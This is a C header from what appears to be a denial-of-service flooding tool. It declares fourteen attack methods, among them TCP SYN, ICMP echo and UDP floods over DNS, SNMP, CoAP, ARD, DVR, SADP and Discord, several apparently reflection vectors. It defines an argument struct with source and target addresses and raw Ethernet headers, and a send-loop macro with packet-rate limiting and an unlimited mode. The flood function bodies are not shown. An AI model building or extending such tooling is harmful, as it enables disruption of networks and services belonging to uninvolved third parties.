/*
 * Copyright (c) 2025, oldteam. All rights reserved.
 *
 * Redistribution and use in source and binary forms, with or without
 * modification, are permitted provided that the following conditions are met:
 *
 * 1. Redistributions of source code must retain the above copyright notice, this
 *    list of conditions and the following disclaimer.
 * 2. Redistributions in binary form must reproduce the above copyright notice,
 *   this list of conditions and the following disclaimer in the documentation
 *   and/or other materials provided with the distribution.
 *
 * THIS SOFTWARE IS PROVIDED BY THE COPYRIGHT HOLDERS AND CONTRIBUTORS "AS IS" AND
 * ANY EXPRESS OR IMPLIED WARRANTIES, INCLUDING, BUT NOT LIMITED TO, THE IMPLIED
 * WARRANTIES OF MERCHANTABILITY AND FITNESS FOR A PARTICULAR PURPOSE ARE
 * DISCLAIMED. IN NO EVENT SHALL THE COPYRIGHT OWNER OR CONTRIBUTORS BE LIABLE FOR
 * ANY DIRECT, INDIRECT, INCIDENTAL, SPECIAL, EXEMPLARY, OR CONSEQUENTIAL DAMAGES
 * (INCLUDING, BUT NOT LIMITED TO, PROCUREMENT OF SUBSTITUTE GOODS OR SERVICES;
 * LOSS OF USE, DATA, OR PROFITS; OR BUSINESS INTERRUPTION) HOWEVER CAUSED AND
 * ON ANY THEORY OF LIABILITY, WHETHER IN CONTRACT, STRICT LIABILITY, OR TORT
 * (INCLUDING NEGLIGENCE OR OTHERWISE) ARISING IN ANY WAY OUT OF THE USE OF THIS
 * SOFTWARE, EVEN IF ADVISED OF THE POSSIBILITY OF SUCH DAMAGE.
*/

#ifndef FLOOD_METHODS_H
#define FLOOD_METHODS_H

#include "include.h"
#include "random.h"
#include "utils.h"
#include "config.h"
#include "interface.h"

#define INITMETHODS()						\
	importmethod(esp_flood,		"esp");			\
	importmethod(icmp_echo_flood,	"icmp echo");		\
	importmethod(tcp_syn_flood,	"tcp syn");		\
	importmethod(ip_empty_flood,	"ip empty");		\
	importmethod(udp_dns_flood,	"udp dns");		\
	importmethod(tcp_tfo_flood,	"tcp tfo");		\
	importmethod(udp_discord_flood,	"udp discord");		\
	importmethod(udp_snmp_flood,	"udp snmp");		\
	importmethod(udp_default_flood,	"udp default");		\
	importmethod(udp_echo_flood,	"udp echo");		\
	importmethod(udp_ard_flood,	"udp ard");		\
	importmethod(udp_dvr_flood,	"udp dvr");		\
	importmethod(udp_sadp_flood,	"udp sadp");		\
	importmethod(udp_coapv2_flood,	"udp coapv2");

#define FLOODRUN(args, iteration, send, pps, time, limit)	\
	if (limit) { \
		for (;;) { \
			iteration; \
			send;\
		} \
	} \
	else { \
		struct timespec start_time,cur_time,sleep_time={0,0}; \
		clock_gettime(CLOCK_MONOTONIC, &start_time); \
		time_t last_sec=start_time.tv_sec; \
		size_t sent=0; \
		for (;;) { \
			clock_gettime(CLOCK_MONOTONIC, &cur_time); \
			if ((cur_time.tv_sec-start_time.tv_sec)>=time) \
				break; \
			if (cur_time.tv_sec!=last_sec) { \
				sent=0; \
				last_sec=cur_time.tv_sec; \
			} \
			if (sent>=pps) { \
				sleep_time.tv_sec=0; \
				sleep_time.tv_nsec=1000000L; \
				nanosleep(&sleep_time,NULL); \
				continue; \
			} \
			iteration; \
			send; \
			++sent; \
		} \
	}

typedef struct __methodargs_t {
	opts_t *o;
	const char *dns;
	u_int target,source;
	eth_t *fd;
	u_char machdr[14];	/* ETHERNET II */
} method_args_t;

typedef void (*flood_t)(method_args_t *a);

typedef struct __method_t {
	flood_t		run;
	const char	*name;
} method_t;

void importmethod(flood_t run, const char *name);
method_t *methods(void);
void printmethods(void);
void printmethod(int id);
u_char validmethod(size_t id);
void execmethod(size_t id, method_args_t *a);

/* methods */
void esp_flood(method_args_t *a);
void icmp_echo_flood(method_args_t *a);
void tcp_syn_flood(method_args_t *a);
void ip_empty_flood(method_args_t *a);
void udp_default_flood(method_args_t *a);
void udp_dns_flood(method_args_t *a);
void tcp_tfo_flood(method_args_t *a);
void udp_discord_flood(method_args_t *a);
void udp_snmp_flood(method_args_t *a);
void udp_coapv2_flood(method_args_t *a);
void udp_echo_flood(method_args_t *a);
void udp_ard_flood(method_args_t *a);
void udp_dvr_flood(method_args_t *a);
void udp_sadp_flood(method_args_t *a);
//void tcp_http_flood(method_args_t *a);

#endif
